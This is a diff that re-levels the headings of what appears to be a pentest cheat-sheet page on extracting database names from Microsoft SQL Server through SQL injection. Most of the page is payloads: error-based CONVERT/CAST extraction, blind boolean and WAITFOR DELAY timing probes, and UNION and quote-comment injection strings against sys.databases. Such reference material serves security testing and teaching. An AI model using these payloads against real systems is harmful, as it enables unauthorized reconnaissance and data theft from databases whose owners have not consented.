@@ -7,11 +7,9 @@ tags: ["database enumeration", "information schema"]
 lastUpdated: 2025-03-15
 ---
 
-## Database Names
-
 Extracting database names is often a crucial step in SQL injection attacks against Microsoft SQL Server. This information helps map the database landscape and identify potential targets for further exploitation.
 
-### System Tables and Views with Database Information
+## System Tables and Views with Database Information
 
 | Source                        | Description                             | Requires Privileges |
 | ----------------------------- | --------------------------------------- | ------------------- |
@@ -20,7 +18,7 @@ Extracting database names is often a crucial step in SQL injection attacks again
 | `information_schema.schemata` | ANSI standard view for databases        | Low                 |
 | `master..sysdatabases`        | Another legacy format                   | Medium              |
 
-### Current Database Context
+## Current Database Context
 
 To get the name of the current database:
 
@@ -28,9 +26,9 @@ To get the name of the current database:
 SELECT DB_NAME();
 ```
 
-### List All Databases
+## List All Databases
 
-#### Using sys.databases (SQL Server 2005+)
+### Using sys.databases (SQL Server 2005+)
 
 ```sql
 -- Get all database names
@@ -42,14 +40,14 @@ FROM sys.databases
 ORDER BY name;
 ```
 
-#### Using information_schema (ANSI Standard)
+### Using information_schema (ANSI Standard)
 
 ```sql
 -- List all database schemas
 SELECT catalog_name FROM information_schema.schemata;
 ```
 
-#### Using Legacy System Tables (SQL Server 2000 and earlier)
+### Using Legacy System Tables (SQL Server 2000 and earlier)
 
 ```sql
 -- Using master..sysdatabases
@@ -59,7 +57,7 @@ SELECT name FROM master..sysdatabases;
 SELECT name FROM master.dbo.sysdatabases;
 ```
 
-### Filtering Database Results
+## Filtering Database Results
 
 ```sql
 -- Get user databases only (excluding system databases)
@@ -71,9 +69,9 @@ SELECT name, create_date FROM sys.databases
 WHERE create_date > '2022-01-01';
 ```
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### In Case of Limited Output
+### In Case of Limited Output
 
 When you can only retrieve one value at a time, consider using string concatenation:
 
@@ -89,14 +87,14 @@ SELECT STUFF((
 ), 1, 1, '');
 ```
 
-#### Using FOR XML PATH For Extraction
+### Using FOR XML PATH For Extraction
 
 ```sql
 -- Get databases as XML
 SELECT name AS 'db' FROM sys.databases FOR XML PATH('');
 ```
 
-### Error-Based Extraction
+## Error-Based Extraction
 
 Using error messages to extract database names:
 
@@ -108,7 +106,7 @@ SELECT CONVERT(int, (SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ('ma
 SELECT CAST((SELECT TOP 1 name FROM sys.databases) AS int);
 ```
 
-### Blind Extraction Techniques
+## Blind Extraction Techniques
 
 For blind SQL injection:
 
@@ -120,7 +118,7 @@ AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 -- ASCI
 IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 WAITFOR DELAY '0:0:5'
 ```
 
-### Practical Examples in Injection Context
+## Practical Examples in Injection Context
 
 ```sql
 -- Using UNION attack
@@ -133,7 +131,7 @@ IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 WAITFOR 
 ' AND SUBSTRING((SELECT TOP 1 name FROM sys.databases ORDER BY name), 1, 6) = 'master'--
 ```
 
-### Notes
+## Notes
 
 1. Some system tables and views require elevated privileges.
 2. The `master` database always exists and is a common first target.
